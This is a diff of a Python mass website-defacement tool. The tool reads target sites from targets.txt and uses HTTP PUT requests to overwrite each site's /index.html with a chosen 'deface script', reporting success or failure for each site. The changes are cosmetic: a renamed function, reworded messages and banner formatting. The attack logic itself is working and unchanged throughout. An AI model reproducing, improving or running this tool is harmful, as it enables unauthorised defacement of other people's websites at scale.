@@ -30,7 +30,7 @@ colors = [
     "\033[38;5;214m",
 ]
 color1, color2, color3, color4, color5 = random.sample(colors, 5)
-banner = """
+banner = f"""
 
              ＿＿
 　　　　 　 / ＞　　フ   
@@ -45,9 +45,9 @@ banner = """
 
 
 
-"""
+"""+reset+blue
 def animate():
-    text = "Uploading script to websites..."
+    text = "Uploading your script to websites..."
     while True:
         for i in range(len(text)):
             print(text[:i] + "_" + text[i+1:], end="\r")
@@ -59,17 +59,17 @@ def eagle(tetew):
    else:
       ipt = raw_input(tetew)   
    return str(ipt)
-def ace(script, target_file="targets.txt"):
+def white(script, target_file="targets.txt"):
     op = open(script, "r").read()
     with open(target_file, "r") as target:
         target = target.readlines()
         s = requests.Session()
         print(" ")
-        print(green+bold+"[✓]\033[0m \033[34mUploading script to %d website...." % (len(target)), end="", flush=True)
+        print(green+bold+"[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
         print(" ")
-	# start the animation thread
+	
         t = threading.Thread(target=animate)
-        t.daemon = True 
+        t.daemon = True  
         t.start()                
         for web in target:
             try:
@@ -78,9 +78,9 @@ def ace(script, target_file="targets.txt"):
                     site = "http://" + site
                 req = s.put(site + "/index.html", data=op)
                 if req.status_code < 200 or req.status_code >= 250:
-                    print(red + "[" + bold + " FAILED!\033[0m     " + red + " ] %s/%s" % (site, script))
+                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
                 else:
-                    print(green + "[" + bold + " SUCCESS!\033[0m" + green + " ] %s/%s" % (site, script))
+                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
             except requests.exceptions.RequestException:
                 continue
             except KeyboardInterrupt:
@@ -92,7 +92,7 @@ def main(__bn__):
       try:
          print(green+'[Please put the deface script/ .html file in this same folder and type it\'s name below]'+reset+blue)
          print(' ')
-         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script \033[33m[Type index.html for built in script]\033[0m \033[34m> ")
+         a = eagle(green+"[+]\033[0m \033[34mEnter your deface script's name \033[33m[Defaut script: index.html]\033[0m \033[34m> ")
          if not os.path.isfile(a):
             print(' ')
             print(red+bold+"	file '%s' not found in this folder !"%(a))
@@ -102,6 +102,6 @@ def main(__bn__):
             break
       except KeyboardInterrupt:
          print; exit()
-   ace(a)
+   white(a)
 if __name__ == "__main__":
     main(banner)
